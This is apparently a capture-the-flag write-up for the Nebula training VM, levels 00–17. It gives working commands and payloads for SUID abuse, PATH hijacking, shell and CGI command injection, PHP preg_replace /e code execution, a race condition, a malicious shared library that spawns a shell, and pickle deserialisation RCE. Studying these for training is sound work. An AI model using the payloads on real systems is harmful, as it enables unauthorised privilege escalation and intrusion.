# Nebula
The main goal is to run getflag on each level from corresponding flagXX user

## level00
[task description](https://exploit-exercises.lains.space/nebula/level00/)

Find SUID binaries: 
```sh
level00@nebula:/home/flag00$ find / -perm -4000 2>/dev/null 
/bin/.../flag00
...

level00@nebula:/home/flag00$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:/home/flag00$ getflag 
You have successfully executed getflag on a target account
```

## level01
[task description](https://exploit-exercises.lains.space/nebula/level01/)

Inspecting src code, see, that there is no verification on env:

```sh
sh-4.2$ cat << EOF > /tmp/test01
> #!/bin/bash
> /bin/getflag
> EOF
sh-4.2$ chmod +x /tmp/echo 
sh-4.2$ PATH=/tmp/ ./flag01 
You have successfully executed getflag on a target account
```


## level02
[task description](https://exploit-exercises.lains.space/nebula/level02/)

User input can control "USER" env and passed to the system() call:
```sh
sh-4.2$ USER="; getflag" ./flag02 
about to call system("/bin/echo ; getflag is cool")

You have successfully executed getflag on a target account

```

## level03
[task description](https://exploit-exercises.lains.space/nebula/level03/)

Here we have directory with improper permissions: 
```sh
sh-4.2$ ls -la
total 6
drwxr-x--- 3 flag03 level03  103 Nov 20  2011 .
drwxr-xr-x 1 root   root      60 Aug 27  2012 ..
-rw-r--r-- 1 flag03 flag03   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 May 18  2011 .bashrc
-rw-r--r-- 1 flag03 flag03   675 May 18  2011 .profile
drwxrwxrwx 2 flag03 flag03     3 Aug 18  2012 writable.d
-rwxr-xr-x 1 flag03 flag03    98 Nov 20  2011 writable.sh
```

and script, which launch files in that directory and delete them by cron.


```sh
sh-4.2$ cat <<EOF > writable.d/test
> #!/bin/bash
> getflag > /tmp/res
> EOF
sh-4.2$ cat /tmp/res
You have successfully executed getflag on a target account
```

## level04
[task description](https://exploit-exercises.lains.space/nebula/level04/)

There is ivalid file open() call, so it's possible to bypass restrictions by creating symbolic link to the token:
```sh
sh-4.2$ ln -s /home/flag04/token  ~/test3
sh-4.2$ ./flag04  ~/test3
06508b5e-8909-4f38-b630-fdb148a848a2 
```

## level05
[task description](https://exploit-exercises.lains.space/nebula/level05/)

Here we have backup archive with ssh private key:

```sh
sh-4.2$ cd .backup/
sh-4.2$ ls
backup-19072011.tgz
sh-4.2$ cp backup-19072011.tgz /tmp/
sh-4.2$ cd  /tmp/

sh-4.2$ gunzip  backup-19072011.tgz 
sh-4.2$ ls 
backup-19072011.tar  echo  level04  res  test01
sh-4.2$ tar -xvf backup-19072011.tar 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys

sh-4.2$ ssh -i .ssh/id_rsa flag05@192.168.56.102
...
flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## level06
[task description](https://exploit-exercises.lains.space/nebula/level06/)


Checking passwd file:
```sh
sh-4.2$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```
Crack password with john and login as flag06 user:
```sh
root@kali:~# john  test  --show
flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left
```

```sh
sh-4.2$ su flag06
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
```

## level07
[task description](https://exploit-exercises.lains.space/nebula/level07/)

Get the port for connection: 
```sh
sh-4.2$ cat thttpd.conf | grep port
# Specifies an alternate port number to listen on.
port=7007
# all hostnames supported on the local machine. See thttpd(8) for details.
```
Inspecting code and find parameter for cmd injection:

```sh
http://192.168.56.102:7007/index.cgi?Host=|getflag

You have successfully executed getflag on a target account
```

## level08
[task description](https://exploit-exercises.lains.space/nebula/level08/)

Inspecting pcap file and following TCP stream : 

```sh
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.l8.8
..
Password: backdoor...00Rm8.ate
.
..
Login incorrect
wwwbugs login: 
```

Inspecting in hex code:
```sh
000000B9  62                                                 b
000000BA  61                                                 a
000000BB  63                                                 c
000000BC  6b                                                 k
000000BD  64                                                 d
000000BE  6f                                                 o
000000BF  6f                                                 o
000000C0  72                                                 r
000000C1  7f                                                 .
000000C2  7f                                                 .
000000C3  7f                                                 .
000000C4  30                                                 0
000000C5  30                                                 0
000000C6  52                                                 R
000000C7  6d                                                 m
000000C8  38                                                 8
000000C9  7f                                                 .
000000CA  61                                                 a
000000CB  74                                                 t
000000CC  65                                                 e
000000CD  0d                                                 .
```

the backspace key is often mapped to the delete character (0x7f in ASCII or Unicode), so password is backd00Rmate : 

```sh
sh-4.2$ su flag08
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
```

## level09 
[task description](https://exploit-exercises.lains.space/nebula/level09/)


In PHP, preg_replace with /e is insecure and deprecated and lead to arbitrary code execution.
Many-many-many tries:
```sh
sh-4.2$ echo "[email(system($use_me))]" > /tmp/9
sh-4.2$ ./flag09 /tmp/9 getflag
<email(system())>
sh-4.2$ echo "[email(phpinfo())]" > /tmp/9
sh-4.2$ ./flag09 /tmp/9 getflag
<email(phpinfo())>
sh-4.2$ echo "[email phpinfo()]" > /tmp/9
sh-4.2$ ./flag09 /tmp/9 getflag
phpinfo()
sh-4.2$ echo "[email {phpinfo()]" > /tmp/9
sh-4.2$ echo "[email ${phpinfo()}]" > /tmp/9
sh: [email ${phpinfo()}]: bad substitution
sh-4.2$ echo "[email ${phpinfo()}]" > /tmp/9
sh: [email ${phpinfo()}]: bad substitution
sh-4.2$ echo "[email {${phpinfo()}}]" > /tmp/9
sh: [email {${phpinfo()}}]: bad substitution
sh-4.2$ echo "[email {${phpinfo()}}]" > /tmp/10
sh: [email {${phpinfo()}}]: bad substitution
sh-4.2$ echo "" > /tmp/9
sh-4.2$ echo "[emain phpinfo()]" > /tmp/9
sh-4.2$ ./flag09 /tmp/9 getflag
<emain phpinfo()>
sh-4.2$ echo "[emain $phpinfo()]" > /tmp/9
sh-4.2$ ./flag09 /tmp/9 getflag
<emain ()>
sh-4.2$ echo "[emain ${phpinfo()}]" > /tmp/9
sh: [emain ${phpinfo()}]: bad substitution
sh-4.2$ echo "[emai\ln ${phpinfo()}]" > /tmp/9
sh: [emai\ln ${phpinfo()}]: bad substitution
sh-4.2$ echo "[email ${phpinfo()}]" > /tmp/9
sh: [email ${phpinfo()}]: bad substitution
sh-4.2$ nano /tmp/9 
sh-4.2$ ./flag09 /tmp/9 getflag
PHP Parse error:  syntax error, unexpected '(' in /home/flag09/flag09.php(15) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
spam("${phpinfo()}") in /home/flag09/flag09.php on line 15
sh-4.2$ nano /tmp/9 
sh-4.2$ ./flag09 /tmp/9 getflag
phpinfo()
PHP Version => 5.3.6-13ubuntu3.2
..

sh-4.2$ cat /tmp/9 
[email {${phpinfo()}}]

```

```sh
sh-4.2$ nano /tmp/9 
sh-4.2$ ./flag09 /tmp/9 getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1

sh-4.2$ cat /tmp/9 
[email {${system($use_me)}}]
```

## level10
[task description](https://exploit-exercises.lains.space/nebula/level10/)

It's example about access() and race conditions.
access()system call checks whether the **real user ID** or group ID has permissions toaccess a file.

open()system call checks whether the **effective user ID** or group ID has permissions to access a file.

Main idea of this exercise is :
1. create /tmp/test file and run target suid flag10 binary 
 
 --->  access() call
 
2. replace /tmp/test with symbolic link to the token

 --->  open() call
 
 Testing flag10 binary:
 ```sh
 sh-4.2$ echo "Hello" > /tmp/token
sh-4.2$ /home/flag10/flag10  /tmp/token 192.168.56.1
Connecting to 192.168.56.1:18211 .. Connected!
Sending file .. wrote file!
sh-4.2$ echo "Hello" > /tmp/token
sh-4.2$ while true; do ln -sf /home/flag10/token test; ln -sf /tmp/token test; done
 ```
 
 
 In the second Nebula terminal:
 ```sh
 level10@nebula:/tmp$ while true; do /home/flag10/flag10  /tmp/test  192.168.56.1; done
Connecting to 192.168.56.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.56.1:18211 .. Connected!
Sending file .. wrote file!
 ```
 
  On the host:
 ```sh
 $ nc -lk 18211
 .oO Oo.
Hello
.oO Oo.
Hello
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
Hello
 ```
 
 ```sh
 level10@nebula:/tmp$ su flag10
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
 ```
 
 
 ## level11
 [task description](https://exploit-exercises.lains.space/nebula/level1/)

 
 ```python
#!/usr/bin/env python

cmd = "c"  
length = len(cmd)
key = length & 0xff

res = ""  
for i in range(len(cmd)):  
        val = (ord(cmd[i]) ^ key) & 0xff 
        res += chr(val)
        key = (key - ord(cmd[i])) & 0xff 

print("Content-Length: " + str(length) + "\n" + res)
```
 
 
 ```sh
level11@nebula:~$ ln -s /bin/getflag  c
level11@nebula:~$ python ex.py  | /home/flag11/flag11 
sh: $'c0\254': command not found
level11@nebula:~$ python ex.py  | /home/flag11/flag11 
getflag is executing on a non-flag account, this doesn't count
```

system() isn't processed  with  setresuid/setresgid and command in this case runs as the real UID instead of flag11 UID. 
Both paths of solving lead to the system() call, in any case, program will be executed without effective privilege.

## level12
[task description](https://exploit-exercises.lains.space/nebula/level12/)

 Here we have  **password**  variable  which could be used in **popen()** call to inject our command.
 A couple tries and we run **getflag** under flag12 user: 
 ```sh
 level12@nebula:/home/flag12$ echo "test" | nc localhost 50001
Password: Better luck next time
level12@nebula:/home/flag12$ echo ";/bin/sh ;" | nc localhost 50001
Password: Better luck next time
level12@nebula:/home/flag12$ echo "1 ; touch /tmp/olol ; echo 112 " | nc localhost 50001
Password: Better luck next time
level12@nebula:/home/flag12$ ls /tmp/ | grep olol
olol
level12@nebula:/home/flag12$ ls -la /tmp/olol 
-rw-r--r-- 1 flag12 flag12 0 Oct  1 05:18 /tmp/olol
level12@nebula:/home/flag12$ echo "1 ; /bin/getflag > /tmp/level12 ; echo 112 " | nc localhost 50001
Password: Better luck next time
level12@nebula:/home/flag12$ ls -la /tmp/level12 
-rw-r--r-- 1 flag12 flag12 59 Oct  1 05:19 /tmp/level12
level12@nebula:/home/flag12$ cat /tmp/level12
You have successfully executed getflag on a target account

 ```
## level13
[task description](https://exploit-exercises.lains.space/nebula/level13/)

Code verifies UID and compares it with 1000. So it seems, that only way to run binary and get token is to pass the check.
Try to run binary with gdb: 
```sh
sh-4.2$ gdb flag13 
GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80484c9
(gdb) r
Starting program: /home/flag13/flag13 

Breakpoint 1, 0x080484c9 in main ()
(gdb) disass 
Dump of assembler code for function main:
   0x080484c4 <+0>:	push   %ebp
   0x080484c5 <+1>:	mov    %esp,%ebp
   0x080484c7 <+3>:	push   %edi
   0x080484c8 <+4>:	push   %ebx
=> 0x080484c9 <+5>:	and    $0xfffffff0,%esp
   0x080484cc <+8>:	sub    $0x130,%esp
   0x080484d2 <+14>:	mov    0xc(%ebp),%eax
   0x080484d5 <+17>:	mov    %eax,0x1c(%esp)
   0x080484d9 <+21>:	mov    0x10(%ebp),%eax
   0x080484dc <+24>:	mov    %eax,0x18(%esp)
   0x080484e0 <+28>:	mov    %gs:0x14,%eax
   0x080484e6 <+34>:	mov    %eax,0x12c(%esp)
   0x080484ed <+41>:	xor    %eax,%eax
   0x080484ef <+43>:	call   0x80483c0 <getuid@plt>
   0x080484f4 <+48>:	cmp    $0x3e8,%eax
   0x080484f9 <+53>:	je     0x8048531 <main+109>
   0x080484fb <+55>:	call   0x80483c0 <getuid@plt>
   0x08048500 <+60>:	mov    $0x80486d0,%edx
   0x08048505 <+65>:	movl   $0x3e8,0x8(%esp)
   0x0804850d <+73>:	mov    %eax,0x4(%esp)
   0x08048511 <+77>:	mov    %edx,(%esp)
   0x08048514 <+80>:	call   0x80483a0 <printf@plt>
   0x08048519 <+85>:	movl   $0x804870c,(%esp)
   0x08048520 <+92>:	call   0x80483d0 <puts@plt>
---Type <return> to continue, or q <return> to quit---q

```

Let's change eax register to 1000:
```sh
(gdb) b *0x080484f4
Breakpoint 2 at 0x80484f4
(gdb) c
Continuing.

Breakpoint 2, 0x080484f4 in main ()

(gdb) i r eax
eax            0x3f6	1014
(gdb) set $eax = 1000
(gdb) i r eax
eax            0x3e8	1000
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 19007) exited with code 063]
``` 
 Login with flag13 account and run **getflag**
 ```sh
 sh-4.2$ su flag13
Password: 
sh-4.2$ id
uid=986(flag13) gid=986(flag13) groups=986(flag13)
sh-4.2$ getflag g
You have successfully executed getflag on a target account
 ```
 
 ## level14
 
 [task description](https://exploit-exercises.lains.space/nebula/level14/)
 We need to decrypt token file: 
 ```sh
 level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
 ```
 
 Open binary in the IDA, we could see next encryption algorithm:
 1. seed = 0
 2. for in i input
 3. input[i] += seed++;
 
 Decrypting token:
 ```python
token = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
seed = 0
res = ""
for i in token:
    res +=(chr(ord(i) - seed))
    seed +=1

print(res)

8457c118-887c-4e40-a5a6-33a25353165

```
 
 ```sh
 sh-4.2$ id
uid=985(flag14) gid=985(flag14) groups=985(flag14)
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 

 ```
 
 
 ## level15

 [task description](https://exploit-exercises.lains.space/nebula/level15/)
 
 
 During **strace** with flag15 binary execution, it is easy to notice, that flag15 tries to load libc.so.6 from the /var/tmp/flag15 directory.
 So we must compile our own library with shell execution. Let's figure out, which functions is used by flag15:
 ```sh
 sh-4.2$ objdump -R ./flag15 

./flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
 ```
 
 The __gmon_start__ element points to the gmon initialization function, which starts the recording of profiling information and registers a cleanup function with atexit(). 
 
 The __libc_start_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function. 
 
 ```sh
 
 sh-4.2$ cat level15.c 
#include <linux/unistd.h>
#include <stdlib.h>

int __libc_start_main(int *(main) (int, char * *, char * *), 
int argc, char * * ubp_av, void (*init) (void), 
void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){

setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
}

```

```sh
sh-4.2$ gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /var/tmp/flag15/level15.c 
sh-4.2$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference

 ```
 
 So we need to add version and __cxa_finalize to our library and statically link library:
 
 ```sh
sh-4.2$ cat /var/tmp/flag15/level15.c 
#include <linux/unistd.h>
#include <stdlib.h>

void __cxa_finalize(void * d){}


int __libc_start_main(int *(main) (int, char * *, char * *), 
int argc, char * * ubp_av, void (*init) (void), 
void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){

setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
}
sh-4.2$ gcc -fPIC -o libc.so.6 -shared level15.c -static-libgcc -Wl,--version-script=version,-Bstatic
sh-4.2$ /home/flag15/flag15 
sh-4.2$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
sh-4.2$ getflag 
You have successfully executed getflag on a target account
```

## level16

[task description](https://exploit-exercises.lains.space/nebula/level16/)
Inspecting code we can see command injection at the line:
```perl
 @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```
Script make uppercase and remove all symbols after a space in the **username** variable. So we create shell script:
```sh
sh-4.2$ cat /tmp/level16 
#!/bin/sh
getflag > /tmp/level16_res

```
Consider that perl script make  **username**  in upper case:
```sh
sh-4.2$ cp /tmp/level16  /tmp/LEVEL
sh-4.2$ chmod +x /tmp/LEVEL
```
And we see that /TMP directory also doesn't exist.  Try to use pathname expansion **/\*/LEVEL**
So command will be:
```sh
;`/*/LEVEL`;
```
Decode it for url and open in browser:
```sh
http://192.168.56.102:1616/index.cgi?username=%3B%60%2F%2A%2FLEVEL%60%3B

```

```sh
level16@nebula:/home/flag16$ cat /tmp/level16_res 
You have successfully executed getflag on a target account
```

##level17
[task description](https://exploit-exercises.lains.space/nebula/level17/)
Inspecting source code we see usage of pickle package and imported os package.
```python
def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

```
According to pickle source code insecure implementation:
```python
def loads(pickled):
    return eval(pickled)
```
Create object and redefine __reduce__ method with payload:
```python
import os
class Test(object):
	def __reduce__(self):
		return (os.system, (("getflag > /tmp/level17_res"), ))

pickle.dump(Test(), open('/tmp/pickled', 'wb'))
```
```sh
sh-4.2$ python /tmp/level17.py 
sh-4.2$ nc localhost 10007 < /tmp/pickled 
Accepted connection from 127.0.0.1:47598
```
In another console check: 
```sh
level17@nebula:~$ cat /tmp/level17_res 
You have successfully executed getflag on a target account
```